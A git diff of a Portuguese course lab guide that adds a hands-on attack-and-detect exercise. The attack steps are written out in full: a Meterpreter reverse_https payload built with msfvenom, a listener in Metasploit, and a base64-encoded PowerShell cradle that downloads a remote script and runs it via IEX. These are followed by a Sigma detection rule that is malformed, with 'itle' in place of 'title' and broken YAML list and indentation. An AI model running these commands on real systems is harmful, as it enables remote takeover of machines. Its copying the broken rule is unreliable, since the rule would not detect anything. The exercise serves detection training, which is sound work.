@@ -283,6 +283,8 @@ Executar script malicioso em ambiente controlado.
 Coletar logs de eventos ID 1 (Process Creation).
 Filtrar por processos com argumentos suspeitos.
 Criar regra Sigma para detectar padrões.
+
+Execução prática
 - Criação do Malware
 ```
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.2.118 LPORT=443 -f exe -o loader.exe
@@ -299,7 +301,7 @@ msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter
 ```
 wget https://raw.githubusercontent.com/thiagosmith/pos-cti-adint/refs/heads/main/Modulo03/scripts/payload.ps1
 ```
-Ajustando o comando no Script "encode-command.py"
+- Ajustando o comando no Script "encode-command.py"
 ```
 $ cat encode-command.py
 import base64
@@ -320,7 +322,7 @@ comando = "(New-Object System.Net.WebClient).DownloadString('http://update-sync.
 print("Comando PowerShell Encodado:")
 print(gerar_comando_encodado(comando))
 ```
-Executando o Script "encode-command.py"
+- Executando o Script "encode-command.py"
 ```
 python encode-command.py
 ```
@@ -329,7 +331,34 @@ python encode-command.py
 Comando PowerShell Encodado:
 powershell -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBzAHkAbgBjAC4AbwByAGcAOgA4ADAAOAAwAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQB8AEkARQBYAA==
 ```
-Executando o coamndo no Windows 10
+- Executando o coamndo no Windows 10
 ```
 powershell -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBzAHkAbgBjAC4AbwByAGcAOgA4ADAAOAAwAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQB8AEkARQBYAA==
+```
+Regra Sigma para detectar padrões
+```
+itle: Suspicious PowerShell EncodedCommand Execution 
+id: 12345678-90ab-cdef-1234-567890abcdef 
+status: experimental 
+description: Detects PowerShell execution with obfuscated commands via -EncodedCommand 
+logsource: 
+    product: windows 
+    category: process_creation 
+detection: 
+    selection: 
+        Image|endswith: 'powershell.exe' 
+        CommandLine|contains: 
+            - '-EncodedCommand' 
+            - 'IEX' - 'Invoke-WebRequest' 
+            - 'DownloadString' 
+    condition: selection
+ fields: 
+    - CommandLine 
+    - ParentImage 
+    - Image 
+    - User
+ level: high 
+tags: 
+    - attack.execution
+    - attack.t1059.001
 ```
